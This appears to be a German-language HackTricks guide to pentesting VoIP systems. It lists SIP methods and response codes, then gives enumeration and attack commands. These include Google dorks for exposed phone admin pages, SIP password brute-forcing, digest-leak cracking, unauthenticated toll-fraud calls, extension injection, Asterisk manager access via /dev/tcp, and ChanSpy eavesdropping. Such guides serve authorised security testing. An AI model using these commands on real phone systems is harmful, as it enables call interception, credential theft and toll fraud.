# Pentesting VoIP

{{#include ../../banners/hacktricks-training.md}}


## VoIP Grundinformationen

Um zu lernen, wie VoIP funktioniert, siehe:

{{#ref}}
basic-voip-protocols/
{{#endref}}

## Grundlegende Nachrichten
```
Request name	Description								RFC references
------------------------------------------------------------------------------------------------------
REGISTER	Register a SIP user.							RFC 3261
INVITE		Initiate a dialog for establishing a call. 				RFC 3261
ACK		Confirm that an entity has received.					RFC 3261
BYE		Signal termination of a dialog and end a call.				RFC 3261
CANCEL		Cancel any pending request.						RFC 3261
UPDATE		Modify the state of a session without changing the state of the dialog.	RFC 3311
REFER		Ask recipient to issue a request for the purpose of call transfer.	RFC 3515
PRACK		Provisional acknowledgement.						RFC 3262
SUBSCRIBE	Initiates a subscription for notification of events from a notifier.	RFC 6665
NOTIFY		Inform a subscriber of notifications of a new event.			RFC 6665
PUBLISH		Publish an event to a notification server.				RFC 3903
MESSAGE		Deliver a text message.	Used in instant messaging applications.		RFC 3428
INFO		Send mid-session information that does not modify the session state.	RFC 6086
OPTIONS		Query the capabilities of an endpoint					RFC 3261
```
## Antwortcodes

**1xx—Vorläufige Antworten**
```
100 Trying
180 Ringing
181 Call is Being Forwarded
182 Queued
183 Session Progress
199 Early Dialog Terminated
```
**2xx—Erfolgreiche Antworten**
```
200 OK
202 Accepted
204 No Notification
```
**3xx—Umleitungsantworten**
```
300 Multiple Choices
301 Moved Permanently
302 Moved Temporarily
305 Use Proxy
380 Alternative Service
```
**4xx—Client-Fehlerantworten**
```
400 Bad Request
401 Unauthorized
402 Payment Required
403 Forbidden
404 Not Found
405 Method Not Allowed
406 Not Acceptable
407 Proxy Authentication Required
408 Request Timeout
409 Conflict
410 Gone
411 Length Required
412 Conditional Request Failed
413 Request Entity Too Large
414 Request-URI Too Long
415 Unsupported Media Type
416 Unsupported URI Scheme
417 Unknown Resource-Priority
420 Bad Extension
421 Extension Required
422 Session Interval Too Small
423 Interval Too Brief
424 Bad Location Information
425 Bad Alert Message
428 Use Identity Header
429 Provide Referrer Identity
430 Flow Failed
433 Anonymity Disallowed
436 Bad Identity-Info
437 Unsupported Certificate
438 Invalid Identity Header
439 First Hop Lacks Outbound Support
440 Max-Breadth Exceeded
469 Bad Info Package
470 Consent Needed
480 Temporarily Unavailable
481 Call/Transaction Does Not Exist
482 Loop Detected
483 Too Many Hops
484 Address Incomplete
485 Ambiguous
486 Busy Here
487 Request Terminated
488 Not Acceptable Here
489 Bad Event
491 Request Pending
493 Undecipherable
494 Security Agreement Required
```
**5xx—Serverfehlerantworten**
```
500 Internal Server Error
501 Not Implemented
502 Bad Gateway
503 Service Unavailable
504 Server Time-out
505 Version Not Supported
513 Message Too Large
555 Push Notification Service Not Supported
580 Precondition Failure
```
**6xx—Globale Fehlerantworten**
```
600 Busy Everywhere
603 Decline
604 Does Not Exist Anywhere
606 Not Acceptable
607 Unwanted
608 Rejected
```
## VoIP Enumeration

### Telefonnummern

Einer der ersten Schritte, die ein Red Team unternehmen könnte, ist die Suche nach verfügbaren Telefonnummern, um mit dem Unternehmen über OSINT-Tools, Google-Suchen oder das Scraping von Webseiten Kontakt aufzunehmen.

Sobald Sie die Telefonnummern haben, könnten Sie Online-Dienste nutzen, um den Anbieter zu identifizieren:

- [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis&sub=phonenr)
- [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
- [https://www.whitepages.com/](https://www.whitepages.com/)
- [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

Wenn Sie wissen, ob der Anbieter VoIP-Dienste anbietet, könnten Sie feststellen, ob das Unternehmen VoIP verwendet... Darüber hinaus ist es möglich, dass das Unternehmen keine VoIP-Dienste in Anspruch genommen hat, sondern PSTN-Karten verwendet, um seine eigene VoIP-PBX mit dem traditionellen Telefonnetz zu verbinden.

Dinge wie automatisierte Musikantworten deuten normalerweise darauf hin, dass VoIP verwendet wird.

### Google Dorks
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### OSINT-Information

Jede andere OSINT-Erhebung, die hilft, die verwendete VoIP-Software zu identifizieren, wird für ein Red Team hilfreich sein.

### Netzwerkerhebung

- **`nmap`** ist in der Lage, UDP-Dienste zu scannen, aber aufgrund der Anzahl der gescannten UDP-Dienste ist es sehr langsam und möglicherweise nicht sehr genau bei dieser Art von Diensten.
```bash
sudo nmap --script=sip-methods -sU -p 5060 10.10.0.0/24
```
- **`svmap`** von SIPVicious (`sudo apt install sipvicious`): Wird SIP-Dienste im angegebenen Netzwerk lokalisieren.
- `svmap` ist **einfach zu blockieren**, da es den User-Agent `friendly-scanner` verwendet, aber Sie könnten den Code von `/usr/share/sipvicious/sipvicious` modifizieren und ihn ändern.
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
- **`SIPPTS-Scan`** von [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS-Scan ist ein sehr schneller Scanner für SIP-Dienste über UDP, TCP oder TLS. Er verwendet Multithreading und kann große Netzwerkbereiche scannen. Es ermöglicht, einen Portbereich einfach anzugeben, sowohl TCP als auch UDP zu scannen, eine andere Methode zu verwenden (standardmäßig wird OPTIONS verwendet) und einen anderen User-Agent anzugeben (und mehr).
```bash
sippts scan -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200
```
- **metasploit**:
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### Zusätzliche Netzwerkenumeration

Die PBX könnte auch andere Netzwerkdienste wie folgt bereitstellen:

- **69/UDP (TFTP)**: Firmware-Updates
- **80 (HTTP) / 443 (HTTPS)**: Um das Gerät über das Web zu verwalten
- **389 (LDAP)**: Alternative zur Speicherung der Benutzerinformationen
- **3306 (MySQL)**: MySQL-Datenbank
- **5038 (Manager)**: Ermöglicht die Nutzung von Asterisk von anderen Plattformen
- **5222 (XMPP)**: Nachrichten über Jabber
- **5432 (PostgreSQL)**: PostgreSQL-Datenbank
- Und andere...

### Methoden-Enumeration

Es ist möglich, **welche Methoden verfügbar sind** zur Nutzung in der PBX mit `SIPPTS enumerate` von [**sippts**](https://github.com/Pepelux/sippts) zu finden.
```bash
sippts enumerate -i 10.10.0.10
```
### Analysieren von Serverantworten

Es ist sehr wichtig, die Header zu analysieren, die ein Server uns zurücksendet, abhängig von der Art der Nachricht und den Headern, die wir senden. Mit `SIPPTS send` von [**sippts**](https://github.com/Pepelux/sippts) können wir personalisierte Nachrichten senden, alle Header manipulieren und die Antwort analysieren.
```bash
sippts send -i 10.10.0.10 -m INVITE -ua Grandstream -fu 200 -fn Bob -fd 11.0.0.1 -tu 201 -fn Alice -td 11.0.0.2 -header "Allow-Events: presence" -sdp
```
Es ist auch möglich, Daten zu erhalten, wenn der Server Websockets verwendet. Mit `SIPPTS wssend` von [**sippts**](https://github.com/Pepelux/sippts) können wir personalisierte WS-Nachrichten senden.
```bash
sippts wssend -i 10.10.0.10 -r 443 -path /ws
```
### Erweiterung Enumeration

Erweiterungen in einem PBX (Private Branch Exchange) System beziehen sich auf die **einzigartigen internen Identifikatoren, die einzelnen** Telefonleitungen, Geräten oder Benutzern innerhalb einer Organisation oder eines Unternehmens zugewiesen sind. Erweiterungen ermöglichen es, **Anrufe innerhalb der Organisation effizient zu routen**, ohne dass für jeden Benutzer oder jedes Gerät individuelle externe Telefonnummern erforderlich sind.

- **`svwar`** von SIPVicious (`sudo apt install sipvicious`): `svwar` ist ein kostenloser SIP PBX Erweiterungslinien-Scanner. Im Konzept funktioniert es ähnlich wie traditionelle Wardialer, indem es **eine Reihe von Erweiterungen oder eine gegebene Liste von Erweiterungen errät**.
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
- **`SIPPTS exten`** von [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS exten identifiziert Erweiterungen auf einem SIP-Server. Sipexten kann große Netzwerk- und Portbereiche überprüfen.
```bash
sippts exten -i 10.10.0.10 -r 5060 -e 100-200
```
- **metasploit**: Sie können auch Erweiterungen/Benutzernamen mit metasploit auflisten:
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
- **`enumiax` (`apt install enumiax`): enumIAX** ist ein Inter Asterisk Exchange-Protokoll **Benutzername-Brute-Force-Enumerator**. enumIAX kann in zwei verschiedenen Modi arbeiten: sequentielles Benutzernamen-Raten oder Wörterbuchangriff.
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## VoIP-Angriffe

### Passwort-Brute-Force - online

Nachdem das **PBX** und einige **Erweiterungen/Benutzernamen** entdeckt wurden, könnte ein Red Team versuchen, sich über die `REGISTER`-Methode bei einer Erweiterung zu authentifizieren, indem es ein Wörterbuch mit gängigen Passwörtern verwendet, um die Authentifizierung zu brute-forcen.

> [!CAUTION]
> Beachten Sie, dass ein **Benutzername** derselbe wie die Erweiterung sein kann, aber diese Praxis je nach PBX-System, dessen Konfiguration und den Vorlieben der Organisation variieren kann...
>
> Wenn der Benutzername nicht derselbe wie die Erweiterung ist, müssen Sie **den Benutzernamen herausfinden, um ihn zu brute-forcen**.

- **`svcrack`** von SIPVicious (`sudo apt install sipvicious`): SVCrack ermöglicht es Ihnen, das Passwort für einen bestimmten Benutzernamen/eine bestimmte Erweiterung auf einem PBX zu knacken.
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```
- **`SIPPTS rcrack`** von [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rcrack ist ein Remote-Passwort-Cracker für SIP-Dienste. Rcrack kann Passwörter für mehrere Benutzer in verschiedenen IPs und Portbereichen testen.
```bash
sippts rcrack -i 10.10.0.10 -e 100,101,103-105 -w wordlist/rockyou.txt
```
- **Metasploit**:
- [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb)
- [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack_tcp.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack_tcp.rb)

### VoIP Sniffing

Wenn Sie VoIP-Geräte in einem **Open Wifi-Netzwerk** finden, könnten Sie **alle Informationen sniffen**. Darüber hinaus, wenn Sie sich in einem geschlosseneren Netzwerk (verbunden über Ethernet oder geschütztes Wifi) befinden, könnten Sie **MitM-Angriffe wie** [**ARPspoofing**](../../generic-methodologies-and-resources/pentesting-network/index.html#arp-spoofing) zwischen der **PBX und dem Gateway** durchführen, um die Informationen zu sniffen.

Unter den Netzwerkinformationen könnten Sie **Web-Anmeldeinformationen** finden, um die Geräte zu verwalten, Benutzer-**Durchwahlen**, **Benutzernamen**, **IP**-Adressen, sogar **gehashte Passwörter** und **RTP-Pakete**, die Sie reproduzieren könnten, um **das Gespräch zu hören**, und mehr.

Um diese Informationen zu erhalten, könnten Sie Tools wie Wireshark, tcpdump... verwenden, aber ein **speziell entwickeltes Tool zum Sniffen von VoIP-Gesprächen ist** [**ucsniff**](https://github.com/Seabreg/ucsniff).

> [!CAUTION]
> Beachten Sie, dass wenn **TLS in der SIP-Kommunikation verwendet wird**, Sie die SIP-Kommunikation nicht im Klartext sehen können.\
> Dasselbe wird passieren, wenn **SRTP** und **ZRTP** verwendet werden, **RTP-Pakete werden nicht im Klartext sein**.

#### SIP-Anmeldeinformationen (Passwort-Brute-Force - offline)

[Überprüfen Sie dieses Beispiel, um eine **SIP REGISTER-Kommunikation** besser zu verstehen](basic-voip-protocols/sip-session-initiation-protocol.md#sip-register-example), um zu lernen, wie **Anmeldeinformationen gesendet werden**.

- **`sipdump`** & **`sipcrack`,** Teil von **sipcrack** (`apt-get install sipcrack`): Diese Tools können **aus einer **pcap** die **Digest-Authentifizierungen** innerhalb des SIP-Protokolls extrahieren und **bruteforcen**.
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```
- **`SIPPTS dump`** von [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dump kann Digest-Authentifizierungen aus einer pcap-Datei extrahieren.
```bash
sippts dump -f capture.pcap -o data.txt
```
- **`SIPPTS dcrack`** von [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dcrack ist ein Tool zum Knacken der mit SIPPTS dump erhaltenen Digest-Authentifizierungen.
```bash
sippts dcrack -f data.txt -w wordlist/rockyou.txt
```
- **`SIPPTS tshark`** von [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS tshark extrahiert Daten des SIP-Protokolls aus einer PCAP-Datei.
```bash
sippts tshark -f capture.pcap [-filter auth]
```
#### DTMF-Codes

**Nicht nur SIP-Anmeldeinformationen** können im Netzwerkverkehr gefunden werden, es ist auch möglich, DTMF-Codes zu finden, die beispielsweise verwendet werden, um auf die **Voicemail** zuzugreifen.\
Es ist möglich, diese Codes in **INFO SIP-Nachrichten**, in **Audio** oder innerhalb von **RTP-Paketen** zu senden. Wenn die Codes in RTP-Paketen enthalten sind, könnten Sie diesen Teil des Gesprächs ausschneiden und das Tool multimo verwenden, um sie zu extrahieren:
```bash
multimon -a DTMF -t wac pin.wav
```
### Kostenlose Anrufe / Asterisk-Verbindungsfehlkonfigurationen

In Asterisk ist es möglich, eine Verbindung **von einer bestimmten IP-Adresse** oder von **irgendeiner IP-Adresse** zuzulassen:
```
host=10.10.10.10
host=dynamic
```
Wenn eine IP-Adresse angegeben ist, muss der Host **keine REGISTER**-Anfragen von Zeit zu Zeit senden (im REGISTER-Paket wird die Lebensdauer angegeben, normalerweise 30 Minuten, was bedeutet, dass das Telefon in einem anderen Szenario alle 30 Minuten REGISTRIEREN muss). Es müssen jedoch offene Ports vorhanden sein, die Verbindungen vom VoIP-Server zu Anrufen zulassen.

Um Benutzer zu definieren, können sie wie folgt definiert werden:

- **`type=user`**: Der Benutzer kann nur Anrufe als Benutzer empfangen.
- **`type=friend`**: Es ist möglich, Anrufe als Peer zu tätigen und sie als Benutzer zu empfangen (wird mit Erweiterungen verwendet).
- **`type=peer`**: Es ist möglich, Anrufe als Peer zu senden und zu empfangen (SIP-Trunks).

Es ist auch möglich, Vertrauen mit der unsicheren Variable herzustellen:

- **`insecure=port`**: Erlaubt Peer-Verbindungen, die durch IP validiert werden.
- **`insecure=invite`**: Erfordert keine Authentifizierung für INVITE-Nachrichten.
- **`insecure=port,invite`**: Beides.

> [!WARNING]
> Wenn **`type=friend`** verwendet wird, wird der **Wert** der **Host**-Variable **nicht verwendet**, sodass, wenn ein Administrator **einen SIP-Trunk falsch konfiguriert**, **jeder sich damit verbinden kann**.
>
> Zum Beispiel wäre diese Konfiguration anfällig:\
> `host=10.10.10.10`\
> `insecure=port,invite`\
> `type=friend`

### Kostenlose Anrufe / Asterisk-Kontextfehlkonfigurationen

In Asterisk ist ein **Kontext** ein benannter Container oder Abschnitt im Wählplan, der **verwandte Erweiterungen, Aktionen und Regeln gruppiert**. Der Wählplan ist das Kernstück eines Asterisk-Systems, da er definiert, **wie eingehende und ausgehende Anrufe behandelt und weitergeleitet werden**. Kontexte werden verwendet, um den Wählplan zu organisieren, die Zugriffskontrolle zu verwalten und eine Trennung zwischen verschiedenen Teilen des Systems bereitzustellen.

Jeder Kontext wird in der Konfigurationsdatei definiert, typischerweise in der **`extensions.conf`**-Datei. Kontexte werden durch eckige Klammern angezeigt, wobei der Kontextname darin eingeschlossen ist. Zum Beispiel:
```bash
csharpCopy code[my_context]
```
Im Kontext definieren Sie Erweiterungen (Muster gewählter Nummern) und verknüpfen sie mit einer Reihe von Aktionen oder Anwendungen. Diese Aktionen bestimmen, wie der Anruf verarbeitet wird. Zum Beispiel:
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
Dieses Beispiel demonstriert einen einfachen Kontext namens "my_context" mit einer Erweiterung "100". Wenn jemand 100 wählt, wird der Anruf angenommen, eine Willkommensnachricht abgespielt und dann wird der Anruf beendet.

Dies ist **ein weiterer Kontext**, der es ermöglicht, **eine andere Nummer anzurufen**:
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
Wenn der Administrator den **Standardkontext** definiert als:
```
[default]
include => my_context
include => external
```
> [!WARNING]
> Jeder wird in der Lage sein, den **Server zu nutzen, um zu jeder anderen Nummer zu telefonieren** (und der Administrator des Servers wird für den Anruf bezahlen).

> [!CAUTION]
> Darüber hinaus enthält die **`sip.conf`**-Datei standardmäßig **`allowguest=true`**, sodass **jeder** Angreifer ohne **Authentifizierung** zu jeder anderen Nummer anrufen kann.

- **`SIPPTS invite`** von [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS invite überprüft, ob ein **PBX-Server es uns erlaubt, Anrufe ohne Authentifizierung zu tätigen**. Wenn der SIP-Server eine falsche Konfiguration hat, erlaubt er uns, Anrufe zu externen Nummern zu tätigen. Es kann uns auch erlauben, den Anruf an eine zweite externe Nummer weiterzuleiten.

Zum Beispiel, wenn Ihr Asterisk-Server eine schlechte Kontextkonfiguration hat, können Sie INVITE-Anfragen ohne Autorisierung akzeptieren. In diesem Fall kann ein Angreifer Anrufe tätigen, ohne Benutzername/Passwort zu kennen.
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
sippts invite -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
sippts invite -i 10.10.0.10 -tu 555555555 -t 444444444
```
### Kostenlose Anrufe / Fehlkonfigurierte IVRS

IVRS steht für **Interactive Voice Response System**, eine Telefontechnologie, die es Benutzern ermöglicht, über Sprach- oder Tastenwahl-Eingaben mit einem computerisierten System zu interagieren. IVRS wird verwendet, um **automatisierte Anrufbearbeitung** Systeme zu erstellen, die eine Vielzahl von Funktionen bieten, wie z.B. Informationen bereitzustellen, Anrufe weiterzuleiten und Benutzereingaben zu erfassen.

IVRS in VoIP-Systemen besteht typischerweise aus:

1. **Sprachansagen**: Vorgefertigte Audio-Nachrichten, die Benutzer durch die IVR-Menüoptionen und Anweisungen führen.
2. **DTMF** (Dual-Tone Multi-Frequency) Signalisierung: Tastenwahl-Eingaben, die durch Drücken von Tasten am Telefon erzeugt werden und verwendet werden, um durch die IVR-Menüs zu navigieren und Eingaben bereitzustellen.
3. **Anrufweiterleitung**: Weiterleitung von Anrufen an das entsprechende Ziel, wie z.B. spezifische Abteilungen, Agenten oder Durchwahlen basierend auf Benutzereingaben.
4. **Benutzereingabenerfassung**: Sammlung von Informationen von Anrufern, wie z.B. Kontonummern, Fall-IDs oder andere relevante Daten.
5. **Integration mit externen Systemen**: Verbindung des IVR-Systems mit Datenbanken oder anderen Software-Systemen, um Informationen abzurufen oder zu aktualisieren, Aktionen auszuführen oder Ereignisse auszulösen.

In einem Asterisk VoIP-System können Sie ein IVR mithilfe des Wählplans (**`extensions.conf`** Datei) und verschiedener Anwendungen wie `Background()`, `Playback()`, `Read()` und mehr erstellen. Diese Anwendungen helfen Ihnen, Sprachansagen abzuspielen, Benutzereingaben zu erfassen und den Anrufverlauf zu steuern.

#### Beispiel für eine anfällige Konfiguration
```scss
exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
Der vorherige ist ein Beispiel, bei dem der Benutzer aufgefordert wird, **1 zu drücken, um** eine Abteilung anzurufen, **2 zu drücken, um** eine andere anzurufen, oder **die vollständige Durchwahl** anzugeben, wenn er sie kennt.\
Die Schwachstelle besteht darin, dass die angegebene **Durchwahl-Länge nicht überprüft wird, sodass ein Benutzer die 5-Sekunden-Timeout eine vollständige Nummer eingeben könnte und diese angerufen wird.**

### Extension Injection

Verwendung einer Durchwahl wie:
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
Wo **`${EXTEN}`** die **Durchwahl** ist, die angerufen wird, wenn die **Durchwahl 101 eingegeben wird**, würde Folgendes passieren:
```scss
exten => 101,1,Dial(SIP/101)
```
Wenn jedoch **`${EXTEN}`** die Einführung von **mehr als nur Zahlen** erlaubt (wie in älteren Asterisk-Versionen), könnte ein Angreifer **`101&SIP123123123`** eingeben, um die Telefonnummer 123123123 anzurufen. Und das wäre das Ergebnis:
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
Daher wird ein Anruf an die Nebenstelle **`101`** und **`123123123`** gesendet, und nur die erste, die den Anruf erhält, wird hergestellt... aber wenn ein Angreifer eine **Nebenstelle verwendet, die jede Übereinstimmung umgeht**, die durchgeführt wird, aber nicht existiert, könnte er **einen Anruf nur an die gewünschte Nummer injizieren**.

## SIPDigestLeak-Schwachstelle

Die SIP Digest Leak ist eine Schwachstelle, die eine große Anzahl von SIP-Telefonen betrifft, einschließlich sowohl Hardware- als auch Software-IP-Telefone sowie Telefonadapter (VoIP zu analog). Die Schwachstelle ermöglicht **das Leck der Digest-Authentifizierungsantwort**, die aus dem Passwort berechnet wird. Ein **Offline-Passwortangriff ist dann möglich** und kann die meisten Passwörter basierend auf der Challenge-Antwort wiederherstellen.

**[Schwachstellenszenario von hier**](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf):

1. Ein IP-Telefon (Opfer) hört auf einem beliebigen Port (zum Beispiel: 5060) und akzeptiert Anrufe
2. Der Angreifer sendet eine INVITE an das IP-Telefon
3. Das Opfertelefon beginnt zu klingeln und jemand hebt ab und legt auf (weil niemand den Anruf am anderen Ende beantwortet)
4. Wenn das Telefon aufgelegt wird, **sendet das Opfertelefon ein BYE an den Angreifer**
5. Der **Angreifer gibt eine 407-Antwort aus**, die **nach Authentifizierung fragt** und eine Authentifizierungsherausforderung ausgibt
6. Das **Opfertelefon gibt eine Antwort auf die Authentifizierungsherausforderung** in einem zweiten BYE
7. Der **Angreifer kann dann einen Brute-Force-Angriff** auf die Challenge-Antwort auf seinem lokalen Rechner (oder verteilten Netzwerk usw.) durchführen und das Passwort erraten

- **SIPPTS-Leck** von [**sippts**](https://github.com/Pepelux/sippts)**:** Das SIPPTS-Leck nutzt die SIP Digest Leak-Schwachstelle aus, die eine große Anzahl von SIP-Telefonen betrifft. Die Ausgabe kann im SipCrack-Format gespeichert werden, um sie mit SIPPTS dcrack oder dem SipCrack-Tool zu bruteforcen.
```bash
sippts leak -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### Click2Call

Click2Call ermöglicht es einem **Webbenutzer** (der beispielsweise an einem Produkt interessiert sein könnte), seine **Telefonnummer** einzugeben, um einen Anruf zu erhalten. Dann wird ein Anruf an eine Commercial getätigt, und wenn er **den Hörer abnimmt**, wird der Benutzer **angeklingelt und mit dem Agenten verbunden**.

Ein gängiges Asterisk-Profil dafür ist:
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
- Das vorherige Profil erlaubt **JEDER IP-Adresse den Zugriff** (wenn das Passwort bekannt ist).
- Um **einen Anruf zu organisieren**, wie zuvor angegeben, sind **keine Leseberechtigungen erforderlich** und es ist **nur** **Originate** in **Write** erforderlich.

Mit diesen Berechtigungen könnte jede IP, die das Passwort kennt, sich verbinden und zu viele Informationen extrahieren, wie:
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
**Weitere Informationen oder Aktionen können angefordert werden.**

### **Abhören**

In Asterisk ist es möglich, den Befehl **`ChanSpy`** zu verwenden, um die **Erweiterung(en) zu überwachen** (oder alle) und Gespräche zu hören, die stattfinden. Dieser Befehl muss einer Erweiterung zugewiesen werden.

Zum Beispiel, **`exten => 333,1,ChanSpy('all',qb)`** bedeutet, dass wenn Sie die **Erweiterung 333 anrufen**, es **alle** Erweiterungen **überwacht**, **beginnt zuzuhören**, wann immer ein neues Gespräch beginnt (**`b`**) im ruhigen Modus (**`q`**), da wir nicht interagieren möchten. Sie können von einem laufenden Gespräch zum anderen wechseln, indem Sie **`*`** drücken oder die Erweiterungsnummer wählen.

Es ist auch möglich, **`ExtenSpy`** zu verwenden, um nur eine Erweiterung zu überwachen.

Anstatt die Gespräche anzuhören, ist es möglich, sie in Dateien **aufzuzeichnen** mit einer Erweiterung wie:
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
Anrufe werden in **`/tmp`** gespeichert.

Sie könnten Asterisk auch dazu bringen, ein Skript auszuführen, das den Anruf **leakt**, wenn er beendet wird.
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### RTCPBleed-Sicherheitsanfälligkeit

**RTCPBleed** ist ein schwerwiegendes Sicherheitsproblem, das Asterisk-basierte VoIP-Server betrifft (veröffentlicht im Jahr 2017). Die Sicherheitsanfälligkeit ermöglicht es, dass **RTP (Real Time Protocol)-Verkehr**, der VoIP-Gespräche überträgt, **von jedem im Internet abgefangen und umgeleitet werden kann**. Dies geschieht, weil RTP-Verkehr die Authentifizierung umgeht, wenn er durch NAT (Network Address Translation)-Firewalls navigiert.

RTP-Proxys versuchen, **NAT-Einschränkungen** zu beheben, die RTC-Systeme betreffen, indem sie RTP-Streams zwischen zwei oder mehr Parteien proxen. Wenn NAT vorhanden ist, kann die RTP-Proxy-Software oft nicht auf die RTP-IP- und Portinformationen zugreifen, die über Signalisierung (z. B. SIP) abgerufen werden. Daher haben eine Reihe von RTP-Proxys einen Mechanismus implementiert, bei dem solche **IP- und Port-Tuple automatisch gelernt werden**. Dies geschieht oft, indem eingehender RTP-Verkehr inspiziert und die Quell-IP und der Port für eingehenden RTP-Verkehr als die markiert werden, auf die geantwortet werden soll. Dieser Mechanismus, der als "Lernmodus" bezeichnet werden kann, **verwendet keine Art von Authentifizierung**. Daher können **Angreifer** **RTP-Verkehr an den RTP-Proxy senden** und den proxierten RTP-Verkehr empfangen, der für den Anrufer oder den Angerufenen eines laufenden RTP-Streams bestimmt ist. Wir nennen diese Sicherheitsanfälligkeit RTP Bleed, weil sie Angreifern ermöglicht, RTP-Medienströme zu empfangen, die für legitime Benutzer bestimmt sind.

Ein weiteres interessantes Verhalten von RTP-Proxys und RTP-Stacks ist, dass sie manchmal, **selbst wenn sie nicht anfällig für RTP Bleed sind**, **RTP-Pakete von jeder Quelle akzeptieren, weiterleiten und/oder verarbeiten**. Daher können Angreifer RTP-Pakete senden, die es ihnen ermöglichen, ihre Medien anstelle der legitimen einzuspeisen. Wir nennen diesen Angriff RTP-Injection, weil er die Einspeisung illegitimer RTP-Pakete in bestehende RTP-Streams ermöglicht. Diese Sicherheitsanfälligkeit kann sowohl in RTP-Proxys als auch in Endpunkten gefunden werden.

Asterisk und FreePBX haben traditionell die **`NAT=yes`-Einstellung** verwendet, die es RTP-Verkehr ermöglicht, die Authentifizierung zu umgehen, was potenziell zu keinem Audio oder einseitigem Audio bei Anrufen führen kann.

Für weitere Informationen siehe [https://www.rtpbleed.com/](https://www.rtpbleed.com/)

- **`SIPPTS rtpbleed`** von [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleed erkennt die RTP Bleed-Sicherheitsanfälligkeit, indem RTP-Streams gesendet werden.
```bash
sippts rtpbleed -i 10.10.0.10
```
